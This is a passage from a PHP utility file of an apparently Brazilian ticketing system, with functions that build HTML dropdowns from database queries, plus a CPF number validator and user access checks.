    $combo .= '<option value="' . $rs['CODTIPBILHETE'] . '"' . $isSelected . '>' . utf8_encode2($rs['DS_NOME_SITE']) . '</option>';
    }
    $combo .= '</select>';

    return $isCombo ? $combo : $text;
}

// Cria combo de situações
function comboSituacao($name, $situacao = null, $isCombo = true) {
    $dados = array("V" => "Escolha a opção...",
                    "F" => "Finalizado",
                    "P" => "Em Processamento",
                    "C" => "Cancelado pelo Usuário",
                    "E" => "Expirado",
                    "S" => "Estornado",
                    "N" => "Negado");
    
    $combo = "<select name=\"" . $name . "\" id=\"" . $name . "\">";
    foreach ($dados as $key => $valor) {
        if ($situacao == $key) {
            $selected = "selected=\"selecteded\"";
            $text = $valor;
        } else {
            $selected = "";
        }
        $combo .= "<option value=\"" . $key . "\"" . $selected . ">" . $valor . "</option>";
    }
    $combo .= "</select>";

    return $isCombo ? $combo : $text;
}

function comboFormaEntrega($forma = null) {
    $dados = array(
        "R" => "E-ticket",
        "E" => "no Endereço"
    );

    foreach ($dados as $key => $valor) {
        if ($key == $forma) {
            $return = $valor;
        }
    }

    return $return;
}

function comboLocal($name, $selected = '-1', $isCombo = true) {
    $mainConnection = mainConnection();
    $query = 'SELECT ID_BASE, DS_NOME_TEATRO, DS_NOME_BASE_SQL FROM CI_MIDDLEWAY..MW_BASE WHERE IN_ATIVO = 1 ORDER BY 2';
    $result = executeSQL($mainConnection, $query);

    $combo = '<select name="' . $name . '" class="inputStyle" id="' . $name . '"><option value="">Selecione um tipo...</option>';
    while ($rs = fetchResult($result)) {
    if (($selected == $rs['ID_BASE'])) {
        $isSelected = 'selected';
        $text = '<span name="' . $name . '" class="inputStyle">' . utf8_encode2($rs["DS_NOME_TEATRO"]) . '</span>';
    } else {
        $isSelected = '';
    }
    $combo .= '<option value="' . $rs['ID_BASE'] . '"' . $isSelected . '>' . utf8_encode2($rs["DS_NOME_TEATRO"]) . '</option>';
    }
    $combo .= '</select>';

    return $isCombo ? $combo : $text;
}

function comboEventos($idBase, $nomeBase, $idUsuario) {
    $mainConnection = mainConnection();
    $tsql = "SELECT P.CODPECA, P.NOMPECA
              FROM 
                  " . $nomeBase . "..TABPECA P
                  INNER JOIN 
                  CI_MIDDLEWAY..MW_ACESSO_CONCEDIDO A
                  ON    A.CODPECA = P.CODPECA
                  AND A.ID_BASE = ?
                  AND A.ID_USUARIO = ?
              WHERE STAPECA = 'A' ORDER BY 2";
    $stmt = executeSQL($mainConnection, $tsql, array($idBase, $idUsuario));
    print("<option value=\"null\">Todos</option>");
    while ($eventos = fetchResult($stmt)) {
    print("<option value=\"" . $eventos["CODPECA"] . "\">" . utf8_encode2($eventos["NOMPECA"]) . "</option>\n");
    }
}

function comboPatrocinador($name, $selected = '-1', $isCombo = true) {
    $mainConnection = mainConnection();
    $query = 'SELECT ID_PATROCINADOR, DS_NOMPATROCINADOR FROM MW_PATROCINADOR ORDER BY DS_NOMPATROCINADOR ASC';
    $result = executeSQL($mainConnection, $query);

    $combo = '<select name="' . $name . '" class="inputStyle" id="' . $name . '"><option value="">Selecione um patrocinador...</option>';
    while ($rs = fetchResult($result)) {
    if ($selected == $rs['ID_PATROCINADOR']) {
        $isSelected = 'selected';
        $text = utf8_encode2($rs['DS_NOMPATROCINADOR']);
    } else {
        $isSelected = '';
    }
    $combo .= '<option value="' . $rs['ID_PATROCINADOR'] . '"' . $isSelected . '>' . utf8_encode2($rs['DS_NOMPATROCINADOR']) . '</option>';
    }
    $combo .= '</select>';

    return $isCombo ? $combo : $text;
}

function comboCartaoPatrocinado($name, $idPatrocinador, $selected = '-1', $isCombo = true) {
    $mainConnection = mainConnection();
    $query = 'SELECT ID_CARTAO_PATROCINADO, DS_CARTAO_PATROCINADO FROM MW_CARTAO_PATROCINADO WHERE ID_PATROCINADOR = ?';
    $result = executeSQL($mainConnection, $query, array($idPatrocinador));

    $combo = '<select name="' . $name . '" class="inputStyle" id="' . $name . '"><option value="">Selecione um cart&atilde;o patrocinado...</option><option value="TODOS">&lt; TODOS &gt;</option>';
    while ($rs = fetchResult($result)) {
    if ($selected == $rs['ID_CARTAO_PATROCINADO']) {
        $isSelected = 'selected';
        $text = utf8_encode2($rs['DS_CARTAO_PATROCINADO']);
    } else {
        $isSelected = '';
    }
    $combo .= '<option value="' . $rs['ID_CARTAO_PATROCINADO'] . '"' . $isSelected . '>' . utf8_encode2($rs['DS_CARTAO_PATROCINADO']) . '</option>';
    }
    $combo .= '</select>';

    return $isCombo ? $combo : $text;
}

function comboTabPeca($name, $conn, $selected = '-1', $isCombo = true) {
    $query = 'SELECT CODPECA, NOMPECA FROM TABPECA ORDER BY NOMPECA';
    $result = executeSQL($conn, $query);

    $combo = '<select name="' . $name . '" class="inputStyle" id="' . $name . '"><option value="">Selecione uma pe&ccedil;a...</option>';
    while ($rs = fetchResult($result)) {
    if ($selected == $rs['CODPECA']) {
        $isSelected = 'selected';
        $text = utf8_encode2($rs['NOMPECA']);
    } else {
        $isSelected = '';
    }
    $combo .= '<option value="' . $rs['CODPECA'] . '"' . $isSelected . '>' . utf8_encode2($rs['NOMPECA']) . '</option>';
    }
    $combo .= '</select>';

    return $isCombo ? $combo : $text;
}

function comboEventosItau($name, $user, $selected = '-1') {
    $mainConnection = mainConnection();
    $query = 'SELECT E.ID_EVENTO, E.DS_EVENTO
                FROM MW_EVENTO E
                INNER JOIN MW_USUARIO_ITAU_EVENTO U ON E.ID_EVENTO = U.ID_EVENTO
                WHERE U.ID_USUARIO = ? AND E.IN_VENDE_ITAU = 1
                ORDER BY DS_EVENTO';
    $result = executeSQL($mainConnection, $query, array($user));

    $combo = '<select name="' . $name . '" class="inputStyle" id="' . $name . '"><option value="">Selecione um evento...</option>';
    while ($rs = fetchResult($result)) {
    if ($selected == $rs['ID_EVENTO']) {
        $isSelected = ' selected';
    } else {
        $isSelected = '';
    }
    $combo .= '<option value="' . $rs['ID_EVENTO'] . '"' . $isSelected . '>' . utf8_encode2($rs['DS_EVENTO']) . '</option>';
    }
    $combo .= '</select>';

    return $combo;
}

function comboApresentacoesItau($name, $user, $evento, $selected = '-1') {
    $mainConnection = mainConnection();
    $query = "SELECT A.ID_APRESENTACAO, CONVERT(VARCHAR(10),
                DT_APRESENTACAO, 103) + ' - ' + A.HR_APRESENTACAO + ' || ' + DS_PISO DS_APRESENTACAO,
                A.DT_APRESENTACAO, A.HR_APRESENTACAO
                FROM MW_EVENTO E
                INNER JOIN MW_USUARIO_ITAU_EVENTO U ON E.ID_EVENTO = U.ID_EVENTO
                INNER JOIN MW_APRESENTACAO A ON A.ID_EVENTO = E.ID_EVENTO
                WHERE E.ID_EVENTO = ? AND E.IN_VENDE_ITAU = 1 AND U.ID_USUARIO = ? AND A.IN_ATIVO = 1
                AND CONVERT(VARCHAR(8), A.DT_APRESENTACAO,112) >= CONVERT(VARCHAR(8), GETDATE()-2, 112)
                ORDER BY DT_APRESENTACAO, HR_APRESENTACAO";
    $result = executeSQL($mainConnection, $query, array($evento, $user));

    $combo = '<select name="' . $name . '" class="inputStyle" id="' . $name . '"><option value="">Selecione uma apresenta&ccedil;&atilde;o...</option>';
    while ($rs = fetchResult($result)) {
    if ($selected == $rs['ID_APRESENTACAO']) {
        $isSelected = ' selected';
    } else {
        $isSelected = '';
    }
    $combo .= '<option value="' . $rs['ID_APRESENTACAO'] . '"' . $isSelected . '>' . utf8_encode2($rs['DS_APRESENTACAO']) . '</option>';
    }
    $combo .= '</select>';

    return $combo;
}

function comboEventoPorUsuario($name, $teatro, $usuario, $selected) {
    $mainConnection = mainConnection();
    $result = executeSQL($mainConnection, "SELECT AC.CODPECA, E.DS_EVENTO
                                            FROM MW_EVENTO E
                                            INNER JOIN MW_ACESSO_CONCEDIDO AC ON E.ID_BASE = AC.ID_BASE
                                            AND AC.ID_USUARIO = ? AND AC.CODPECA = E.CODPECA
                                            WHERE E.ID_BASE = ?
                                            AND E.IN_ATIVO = '1'
                                            ORDER BY DS_EVENTO",
            array($usuario, $teatro));

    $combo = '<select name="' . $name . '" class="inputStyle" id="' . $name . '"><option value="">Selecione um evento...</option>';
    while ($rs = fetchResult($result)) {
    $combo .= '<option value="' . $rs['CODPECA'] . '"' .
        (($selected == $rs['CODPECA']) ? ' selected' : '') .
        '>' . str_replace("'", "\'", utf8_encode2($rs['DS_EVENTO'])) . '</option>';
    }
    $combo .= '</select>';

    return $combo;
}

function comboTeatroPorUsuario($name, $usuario, $selected) {
    $mainConnection = mainConnection();
    $result = executeSQL($mainConnection, "SELECT DISTINCT B.ID_BASE, B.DS_NOME_TEATRO
                                            FROM MW_BASE B
                                            INNER JOIN MW_ACESSO_CONCEDIDO AC ON B.ID_BASE = AC.ID_BASE
                                            AND AC.ID_USUARIO = ?
                                            WHERE IN_ATIVO = '1'
                                            ORDER BY DS_NOME_TEATRO",
            array($usuario));

    $combo = '<select name="' . $name . '" class="inputStyle" id="' . $name . '"><option value="">Selecione um local...</option>';
    while ($rs = fetchResult($result)) {
    $combo .= '<option value="' . $rs['ID_BASE'] . '"' . (($selected == $rs['ID_BASE']) ? ' selected' : '') . '>' . utf8_encode2($rs['DS_NOME_TEATRO']) . '</option>';
    }
    $combo .= '</select>';

    return $combo;
}

function comboDia($name, $selected, $shortText = false) {
    $combo = '<select name="' . $name . '" class="inputStyle" id="' . $name . '"><option value="">'.($shortText ? 'dia' : 'Selecione um dia...').'</option>';
    for ($i = 1; $i <= 31; $i++) {
    $combo .= '<option value="' . substr('0'.$i, -2) . '"' . (($selected == $i) ? ' selected' : '') . '>' . substr('0'.$i, -2) . '</option>';
    }
    $combo .= '</select>';

    return $combo;
}

function comboMeses($name, $selected, $number = false, $shortText = false) {
    $meses = array(
    '01' => 'Janeiro',
    '02' => 'Fevereiro',
    '03' => 'Março',
    '04' => 'Abril',
    '05' => 'Maio',
    '06' => 'Junho',
    '07' => 'Julho',
    '08' => 'Agosto',
    '09' => 'Setembro',
    '10' => 'Outubro',
    '11' => 'Novembro',
    '12' => 'Dezembro'
    );

    $combo = '<select name="' . $name . '" class="inputStyle" id="' . $name . '"><option value="">'.($shortText ? 'm&ecirc;s' : 'Selecione um m&ecirc;s...').'</option>';
    foreach ($meses as $key => $val) {
    $combo .= '<option value="' . $key . '"' . (($selected == $key) ? ' selected' : '') . '>' . ($number ? $key : ($shortText ? strtolower(substr($val, 0, 3)) : $val)) . '</option>';
    }
    $combo .= '</select>';

    return $combo;
}

function comboAnos($name, $selected, $inicial = 0, $final = 0, $shortText = false) {
    $combo = '<select name="' . $name . '" class="inputStyle" id="' . $name . '"><option value="">'.($shortText ? 'ano' : 'Selecione um ano...').'</option>';
    for ($i = $inicial; $i <= $final; $i++) {
    $combo .= '<option value="' . $i . '"' . (($selected == $i) ? ' selected' : '') . '>' . $i . '</option>';
    }
    $combo .= '</select>';

    return $combo;
}

function comboPaginas($name, $selected) {
    $conn = getConnectionDw();
    $result = executeSQL($conn, "SELECT ID_PAGINA, DS_PAGINA FROM DIM_PAGINA ORDER BY 2", array());

    $combo = '<select name="' . $name . '" class="inputStyle" id="' . $name . '"><option value="">Selecione uma p&aacute;gina...</option>';
    while ($rs = fetchResult($result)) {
    $combo .= '<option value="' . $rs['ID_PAGINA'] . '"' . (($selected == $rs['ID_PAGINA']) ? ' selected' : '') . '>' . utf8_encode2($rs['DS_PAGINA']) . '</option>';
    }
    $combo .= '</select>';

    return $combo;
}

function comboOrigemChamado($name, $selected) {
    $conn = getConnectionDw();
    $result = executeSQL($conn, "SELECT ID_ORIGEM_CHAMADO, DS_ORIGEM_CHAMADO FROM DIM_ORIGEM_CHAMADO ORDER BY 2", array());

    $combo = '<select name="' . $name . '" class="inputStyle" id="' . $name . '"><option value="">Selecione uma origem...</option>';
    while ($rs = fetchResult($result)) {
    $combo .= '<option value="' . $rs['ID_ORIGEM_CHAMADO'] . '"' . (($selected == $rs['ID_ORIGEM_CHAMADO']) ? ' selected' : '') . '>' . utf8_encode2($rs['DS_ORIGEM_CHAMADO']) . '</option>';
    }
    $combo .= '</select>';

    return $combo;
}

function comboTipoChamado($name, $selected) {
    $conn = getConnectionDw();
    $result = executeSQL($conn, "SELECT ID_TIPO_CHAMADO, DS_TIPO_CHAMADO FROM DIM_TIPO_CHAMADO ORDER BY 2", array());

    $combo = '<select name="' . $name . '" class="inputStyle" id="' . $name . '"><option value="">Selecione um tipo...</option>';
    while ($rs = fetchResult($result)) {
    $combo .= '<option value="' . $rs['ID_TIPO_CHAMADO'] . '"' . (($selected == $rs['ID_TIPO_CHAMADO']) ? ' selected' : '') . '>' . utf8_encode2($rs['DS_TIPO_CHAMADO']) . '</option>';
    }
    $combo .= '</select>';

    return $combo;
}

function comboTipoResolucao($name, $selected) {
    $conn = getConnectionDw();
    $result = executeSQL($conn, "SELECT ID_TIPO_RESOLUCAO, DS_TIPO_RESOLUCAO FROM DIM_TIPO_RESOLUCAO ORDER BY 2", array());

    $combo = '<select name="' . $name . '" class="inputStyle" id="' . $name . '"><option value="">Selecione uma resolução...</option>';
    while ($rs = fetchResult($result)) {
    $combo .= '<option value="' . $rs['ID_TIPO_RESOLUCAO'] . '"' . (($selected == $rs['ID_TIPO_RESOLUCAO']) ? ' selected' : '') . '>' . utf8_encode2($rs['DS_TIPO_RESOLUCAO']) . '</option>';
    }
    $combo .= '</select>';

    return $combo;
}

function comboAdmins($name, $selected = '-1', $isCombo = true) {
    $mainConnection = mainConnection();
    $result = executeSQL($mainConnection, 'SELECT ID_USUARIO, DS_NOME FROM  MW_USUARIO WHERE IN_ATIVO = 1 AND IN_ADMIN = 1 ORDER BY DS_NOME ASC');

    $combo = '<select name="' . $name . '" class="inputStyle" id="' . $name . '"><option value="">Selecione um administrador...</option>';
    while ($rs = fetchResult($result)) {
    if ($selected == $rs['ID_USUARIO']) {
        $isSelected = 'selected';
        $text = $rs['DS_NOME'];
    } else {
        $isSelected = '';
    }
    $combo .= '<option value="' . $rs['ID_USUARIO'] . '"' . $isSelected . '>' . addslashes($rs['DS_NOME']) . '</option>';
    }
    $combo .= '</select>';

    return $isCombo ? $combo : $text;
}

function comboTipoLancamento($name, $teatro, $selected) {
    $conn = getConnection($teatro);
    $result = executeSQL($conn, 'SELECT CODTIPLANCAMENTO, TIPLANCAMENTO FROM TABTIPLANCAMENTO ORDER BY TIPLANCAMENTO');

    $combo = '<select name="' . $name . '" class="inputStyle" id="' . $name . '"><option value="">Selecione um tipo...</option>';
    while ($rs = fetchResult($result)) {
    $combo .= '<option value="' . $rs['CODTIPLANCAMENTO'] . '"' .
        (($selected == $rs['CODTIPLANCAMENTO']) ? ' selected' : '') .
        '>' . $rs['TIPLANCAMENTO'] . '</option>';
    }
    $combo .= '</select>';

    return $combo;
}

function comboUsuariosPorBase($name, $teatro, $selected) {
    $conn = getConnection($teatro);
    $result = executeSQL($conn, 'SELECT CODUSUARIO, NOMUSUARIO FROM TABUSUARIO WHERE CODUSUARIO > 0 ORDER BY NOMUSUARIO');

    $combo = '<select name="' . $name . '" class="inputStyle" id="' . $name . '"><option value="">Selecione um usuário...</option>';
    while ($rs = fetchResult($result)) {
    $combo .= '<option value="' . $rs['CODUSUARIO'] . '"' .
        (($selected == $rs['CODUSUARIO']) ? ' selected' : '') .
        '>' . utf8_encode2($rs['NOMUSUARIO']) . '</option>';
    }
    $combo .= '</select>';

    return $combo;
}

function comboTipoDocumento($name, $selected) {
    $mainConnection = mainConnection();
    $result = executeSQL($mainConnection, 'SELECT ID_DOC_ESTRANGEIRO, DS_DOC_ESTRANGEIRO FROM MW_DOC_ESTRANGEIRO');

    $combo = '<select name="' . $name . '" class="inputStyle" id="' . $name . '"><option value="">Document type / Tipo de documento</option>';
    while ($rs = fetchResult($result)) {
    $combo .= '<option value="' . $rs['ID_DOC_ESTRANGEIRO'] . '"' .
        (($selected == $rs['ID_DOC_ESTRANGEIRO']) ? ' selected' : '') .
        '>' . utf8_encode2($rs['DS_DOC_ESTRANGEIRO']) . '</option>';
    }
    $combo .= '</select>';

    return $combo;
}

// combo de setor para o cliente na etapa1
function comboSetor($name, $apresentacao_id) {
    $mainConnection = mainConnection();
    $result = executeSQL($mainConnection, "SELECT ID_APRESENTACAO, DS_PISO FROM MW_APRESENTACAO
                                          WHERE ID_EVENTO = (SELECT ID_EVENTO FROM MW_APRESENTACAO WHERE ID_APRESENTACAO = ? AND IN_ATIVO = '1')
                                          AND DT_APRESENTACAO = (SELECT DT_APRESENTACAO FROM MW_APRESENTACAO WHERE ID_APRESENTACAO = ? AND IN_ATIVO = '1')
                                          AND HR_APRESENTACAO = (SELECT HR_APRESENTACAO FROM MW_APRESENTACAO WHERE ID_APRESENTACAO = ? AND IN_ATIVO = '1')
                                          AND IN_ATIVO = '1'
                                          ORDER BY DS_PISO", array($apresentacao_id, $apresentacao_id, $apresentacao_id));

    $combo = '<select name="' . $name . '" class="inputStyle" id="' . $name . '"><option value="">selecione outro setor</option>';
    while ($rs = fetchResult($result)) {
        // esconde setor atual
        if ($apresentacao_id != $rs['ID_APRESENTACAO']) {
            $combo .= '<option value="' . $rs['ID_APRESENTACAO'] . '">' . utf8_encode2($rs['DS_PISO']) . '</option>';
        }
    }
    $combo .= '</select>';

    return $combo;
}

function comboCanalVenda($name, $selected) {
    $mainConnection = mainConnection();
    $result = executeSQL($mainConnection, 'SELECT ID_CANAL_VENDA, DS_CANAL_VENDA FROM MW_CANAL_VENDA');

    $combo = '<select name="' . $name . '" class="inputStyle" id="' . $name . '"><option value="">Selecione um canal...</option>';
    while ($rs = fetchResult($result)) {
    $combo .= '<option value="' . $rs['ID_CANAL_VENDA'] . '"' .
        (($selected == $rs['ID_CANAL_VENDA']) ? ' selected' : '') .
        '>' . utf8_encode2($rs['DS_CANAL_VENDA']) . '</option>';
    }
    $combo .= '</select>';

    return $combo;
}

function comboPromocoes($name, $selected, $isCombo = true) {
    $mainConnection = mainConnection();
    $result = executeSQL($mainConnection, 'SELECT ID_PROMOCAO_CONTROLE, DS_PROMOCAO FROM MW_PROMOCAO_CONTROLE WHERE IN_ATIVO = 1 ORDER BY DS_PROMOCAO');

    $combo = '<select name="' . $name . '" class="inputStyle" id="' . $name . '"><option value="">Selecione uma promoção...</option>';
    while ($rs = fetchResult($result)) {
        if ($selected == $rs['ID_PROMOCAO_CONTROLE']) {
            $isSelected = 'selected';
            $text = $rs['DS_PROMOCAO'];
        } else {
            $isSelected = '';
        }

        $combo .= '<option value="' . $rs['ID_PROMOCAO_CONTROLE'] . '"' . $isSelected . ' ' .
            (($selected == $rs['ID_PROMOCAO_CONTROLE']) ? ' selected' : '') .
            '>' . utf8_encode2($rs['DS_PROMOCAO']) . '</option>';
    }
    $combo .= '</select>';

    return $isCombo ? $combo : $text;
}

function comboTipoPromocao($name, $selected) {
    $tipos = array(
        1   => 'Código Fixo',
        2   => 'Código Aleatório',
        3   => 'Arquivo CSV',
        4   => 'BIN',
        5   => 'Convite',
        // 6    => 'WebService'
        7   => 'BIN Riachuelo',
        8   => 'Assinatura',
        9   => 'Benefício Assinatura',
        10  => 'Compre X Leve Y'
    );

    asort($tipos);

    $combo = '<select name="' . $name . '" class="inputStyle" id="' . $name . '"><option value="">Selecione...</option>';
    foreach ($tipos as $key => $value) {
        $combo .= '<option value="' . $key . '"' . (($selected == $key) ? ' selected' : '') . '>' . $value . '</option>';
    }
    $combo .= '</select>';

    return $combo;
}

function comboExibicaoPromocao($name, $selected) {
    $tipos = array(
        'T' => 'TODOS',
        'N' => 'NENHUM',
        'W' => 'WEB',
        'P' => 'POS'
    );

    $combo = '<select name="' . $name . '" class="inputStyle" id="' . $name . '"><option value="">Selecione...</option>';
    foreach ($tipos as $key => $value) {
        $combo .= '<option value="' . $key . '"' . (($selected == $key) ? ' selected' : '') . '>' . $value . '</option>';
    }
    $combo .= '</select>';

    return $combo;
}

function comboAssinatura($name, $selected, $multiSelect = false) {
    $mainConnection = mainConnection();
    $result = executeSQL($mainConnection, 'SELECT ID_ASSINATURA, DS_ASSINATURA FROM MW_ASSINATURA ORDER BY DS_ASSINATURA');

    $multi = $multiSelect ? ' multiple data-placeholder="Selecione..."' : '';

    $combo = '<select name="' . $name . '" class="inputStyle" id="'.preg_replace('/\[|\]/', '', $name).'"'.$multi.'>'.($multiSelect ? '' : '<option value="">Selecione...</option>');
    while ($rs = fetchResult($result)) {
        $combo .= '<option value="' . $rs['ID_ASSINATURA'] . '"' . ((in_array($rs['ID_ASSINATURA'], $selected) OR $rs['ID_ASSINATURA'] === $selected) ? ' selected' : '') . '>' . $rs['DS_ASSINATURA'] . '</option>';
    }
    $combo .= '</select>';

    return $combo;
}

function comboGenerico(array $dados, $selectedDados)
{
    $strValue           = $selectedDados['strValue'];
    $regSelected        = $selectedDados['reg'];
    $strShow            = $selectedDados['strToShow'];

    $opt = '';
    foreach ($dados as $dado)
    {
        $selected = '';
        if ($dado[$strValue] == $regSelected)
        {
            $selected = 'selected="selected"';
        }

        $opt .= '<option value="'.$dado[$strValue].'" '.$selected.'>'.$dado[$strShow].'</option>';
    }

    return $opt;
}

function comboBanco($name, $selected) {
    $mainConnection = mainConnection();
    $result = executeSQL($mainConnection, 'SELECT CD_BANCO, DS_BANCO FROM MW_BANCO ORDER BY DS_BANCO');

    $combo = '<select name="' . $name . '" class="inputStyle" id="' . $name . '"><option value="">Selecione...</option>';
    while ($rs = fetchResult($result)) {
    $combo .= '<option value="' . $rs['CD_BANCO'] . '"' .
        (($selected == $rs['CD_BANCO']) ? ' selected' : '') .
        '>' . $rs['CD_BANCO'] . ' - ' . utf8_encode2($rs['DS_BANCO']) . '</option>';
    }
    $combo .= '</select>';

    return $combo;
}

// INICIO DOS COMBOS PARA O SISTEMA DE ASSINATURA (PACOTE) ------------------------------------------

// combo para os eventos que podem ser pacote
function comboEventoPacotePorUsuario($name, $local, $usuario, $selected) {
    $mainConnection = mainConnection();
    $result = executeSQL($mainConnection, "WITH RESULTADO AS (
                                                SELECT MIN(ID_APRESENTACAO) AS ID_APRESENTACAO, DT_APRESENTACAO, HR_APRESENTACAO, DS_EVENTO
                                                FROM MW_APRESENTACAO A
                                                INNER JOIN MW_EVENTO E ON E.ID_EVENTO = A.ID_EVENTO
                                                INNER JOIN MW_ACESSO_CONCEDIDO AC ON AC.ID_BASE = E.ID_BASE AND AC.CODPECA = E.CODPECA AND AC.ID_USUARIO = ?
                                                WHERE A.IN_ATIVO = 1 AND E.IN_ATIVO = 1 AND E.ID_BASE = ?
                                                AND A.ID_APRESENTACAO NOT IN (SELECT ID_APRESENTACAO FROM MW_ITEM_PEDIDO_VENDA)
                                                GROUP BY DS_EVENTO, DT_APRESENTACAO, HR_APRESENTACAO
                                            )
                                            SELECT MIN(ID_APRESENTACAO) AS ID_APRESENTACAO, DS_EVENTO
                                            FROM RESULTADO
                                            GROUP BY DS_EVENTO
                                            HAVING COUNT(ID_APRESENTACAO) = 1
                                            ORDER BY DS_EVENTO",
            array($usuario, $local));

    $combo = '<select name="' . $name . '" class="inputStyle" id="' . $name . '"><option value="">Selecione um evento/pacote...</option>';
    while ($rs = fetchResult($result)) {
    $combo .= '<option value="' . $rs['ID_APRESENTACAO'] . '"' . (($selected == $rs['ID_APRESENTACAO']) ? ' selected' : '') . '>' . utf8_encode2($rs['DS_EVENTO']) . '</option>';
    }
    $combo .= '</select>';

    return $combo;
}

function comboPacote($name, $usuario, $selected, $id_base = null, $fase = null) {
    $mainConnection = mainConnection();

    $filtro_fase = $fase ? "AND DT_FIM_FASE".$fase." >= getdate()" : "";

    $result = executeSQL($mainConnection, "SELECT ID_PACOTE, DS_EVENTO
                                            FROM MW_PACOTE P
                                            INNER JOIN MW_APRESENTACAO A ON A.ID_APRESENTACAO = P.ID_APRESENTACAO
                                            INNER JOIN MW_EVENTO E ON E.ID_EVENTO = A.ID_EVENTO
                                            INNER JOIN MW_ACESSO_CONCEDIDO AC ON AC.ID_BASE = E.ID_BASE AND AC.CODPECA = E.CODPECA AND AC.ID_USUARIO = ?
                                            WHERE (E.ID_BASE = ? or ? is null) $filtro_fase
                                            ORDER BY DS_EVENTO",
            array($usuario, $id_base, $id_base));

    $combo = '<select name="' . $name . '" class="inputStyle" id="' . $name . '"><option value="">Selecione um pacote...</option>';
    while ($rs = fetchResult($result)) {
    $combo .= '<option value="' . $rs['ID_PACOTE'] . '"' . (($selected == $rs['ID_PACOTE']) ? ' selected' : '') . '>' . utf8_encode2($rs['DS_EVENTO']) . '</option>';
    }
    $combo .= '</select>';

    return $combo;
}

// FIM DOS COMBOS PARA O SISTEMA DE ASSINATURA (PACOTE) ------------------------------------------

function is_pacote($id_apresentacao) {
    $mainConnection = mainConnection();

    $result = executeSQL($mainConnection,
                        "SELECT TOP 1 1
                        FROM MW_PACOTE P
                        INNER JOIN MW_APRESENTACAO A ON A.ID_APRESENTACAO = P.ID_APRESENTACAO
                        INNER JOIN MW_APRESENTACAO A2 ON A2.ID_EVENTO = A.ID_EVENTO AND A2.DT_APRESENTACAO = A.DT_APRESENTACAO AND A2.HR_APRESENTACAO = A.HR_APRESENTACAO
                        WHERE A2.ID_APRESENTACAO = ?",
                        array($id_apresentacao));

    return hasRows($result);
}



/*  OUTROS  */



require_once('../settings/mail.php');

function getCurrentUrl() {
    include('../settings/settings.php');

    $pageURL = 'http';

    if ($_SERVER["HTTPS"] == "on") {
        $pageURL .= "s";
    }

    $pageURL .= "://";

    if ($_SERVER["SERVER_PORT"] != "80") {
        $pageURL .= ($_ENV['IS_TEST'] ? $_SERVER["HTTP_HOST"] : $_SERVER["SERVER_NAME"] . ":" . $_SERVER["SERVER_PORT"]) . $_SERVER["REQUEST_URI"];
    } else {
        $pageURL .= ($_ENV['IS_TEST'] ? $_SERVER["HTTP_HOST"] : $_SERVER["SERVER_NAME"]) . $_SERVER["REQUEST_URI"];
    }

    return $pageURL;
}

function printr($array, $titulo = '')
{
    echo $titulo.'<pre>';
        print_r($array);
    echo '</pre>';
}
// ----------------------------

function verificaCPF($cpf) {
    if (!is_numeric($cpf)) {
    return false;
    } else {
    if (($cpf == '11111111111') || ($cpf == '22222222222') ||
        ($cpf == '33333333333') || ($cpf == '44444444444') ||
        ($cpf == '55555555555') || ($cpf == '66666666666') ||
        ($cpf == '77777777777') || ($cpf == '88888888888') ||
        ($cpf == '99999999999') || ($cpf == '00000000000')) {
        return false;
    } else {
        //PEGA O DIGITO VERIFIACADOR
        $dv_informado = substr($cpf, 9, 2);

        for ($i = 0; $i <= 8; $i++) {
        $digito[$i] = substr($cpf, $i, 1);
        }

        //CALCULA O VALOR DO 10º DIGITO DE VERIFICAÇÂO
        $posicao = 10;
        $soma = 0;

        for ($i = 0; $i <= 8; $i++) {
        $soma += $digito[$i] * $posicao;
        $posicao--;
        }

        $digito[9] = $soma % 11;

        if ($digito[9] < 2) {
        $digito[9] = 0;
        } else {
        $digito[9] = 11 - $digito[9];
        }

        //CALCULA O VALOR DO 11º DIGITO DE VERIFICAÇÃO
        $posicao = 11;
        $soma = 0;

        for ($i = 0; $i <= 9; $i++) {
        $soma += $digito[$i] * $posicao;
        $posicao--;
        }

        $digito[10] = $soma % 11;

        if ($digito[10] < 2) {
        $digito[10] = 0;
        } else {
        $digito[10] = 11 - $digito[10];
        }

        //VERIFICA SE O DV CALCULADO É IGUAL AO INFORMADO
        $dv = $digito[9] * 10 + $digito[10];
        if ($dv != $dv_informado) {
        return false;
        } else {
        return true;
        }
    }
    }
}

function acessoPermitido($conn, $idUser, $idPrograma, $echo = false) {
    $query = 'SELECT 1
                 FROM MW_PROGRAMA P
                 INNER JOIN MW_USUARIO_PROGRAMA UP ON UP.ID_PROGRAMA = P.ID_PROGRAMA
                 INNER JOIN MW_USUARIO U ON U.ID_USUARIO = UP.ID_USUARIO
                 WHERE U.ID_USUARIO = ? AND P.ID_PROGRAMA = ?';
    $params = array($idUser, $idPrograma);
    $result = executeSQL($conn, $query, $params);

    $hasRows = hasRows($result);

    if ($echo and !$hasRows)
    echo '<h2>Acesso Negado!</h2>';

    return $hasRows;
}



function acessoPermitidoEvento($idBase, $idUser, $codPeca, $die = false) {
    $mainConnection = mainConnection();
    $query = 'SELECT 1
                FROM MW_ACESSO_CONCEDIDO
                WHERE ID_BASE = ? AND ID_USUARIO = ? AND CODPECA = ?';
    $params = array($idBase, $idUser, $codPeca);
    $result = executeSQL($mainConnection, $query, $params);

    $hasRows = hasRows($result);

    //if (!$hasRows) echo '<h2>Acesso Negado!</h2>';

    if ($die and !$hasRows)
    die();

    return $hasRows;
}

function get_campanha_etapa($etapa) {
    switch ($etapa) {
    /**
        case 'etapa1':
        $tag_avancar = "1._Escolha_de_assentos_-_Avançar-TAG";
        $tag_voltar = "";
        break;
        */
    case 'etapa1':
        $tag_avancar = "2._Conferir_Itens_-_Avançar";
        $tag_voltar = "2._Conferir_Itens_-_Voltar";
        break;
        case 'etapa2':
            $tag_avancar = "3._Identificaçao_-_Autentique-se";
        $tag_voltar = "2._Conferir_Itens_-_Voltar-TAG";
        break;
    case 'etapa3_2':
        $tag_avancar = "3._Identificaçao_-_Autentique-se";
        $tag_voltar = "3._Identificaçao_-_Cadastre-se";
        break;
    case 'etapa4':
        $tag_avancar = "4._Confirmaçao_-_Avançar";
        $tag_voltar = "4._Confirmaçao_-_Alterar_pedido";
        break;
    case 'etapa5':
        $tag_avancar = "";
        $tag_voltar = "5._Pagamento_-_Voltar";
        break;
    case 'cadatro???':
        $tag_avancar = "Cadastro_com_sucesso";
        $tag_voltar = "Cadastro_-_Voltar";
        break;
    case 'pagamento_ok':
        $tag_avancar = "Pagamento_efetuado_com_sucesso";
        $tag_voltar = "";
        break;
    }

    switch ($_GET['tag']) {
    case "1._Escolha_de_assentos_-_Avançar":
        $id = '8741';
        break;
    case "2._Conferir_Itens_-_Avançar":
